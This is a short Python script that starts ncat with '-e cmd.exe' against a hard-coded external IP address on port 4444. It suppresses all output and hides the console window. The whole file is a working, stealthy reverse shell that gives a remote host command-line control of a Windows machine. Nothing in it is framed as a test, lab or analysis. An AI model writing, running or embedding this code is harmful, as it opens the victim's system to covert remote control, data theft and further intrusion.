import subprocess

subprocess.Popen(
    ["ncat", "-nv", "35.208.39.232", "4444", "-e", "cmd.exe"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
    creationflags=subprocess.CREATE_NO_WINDOW
)
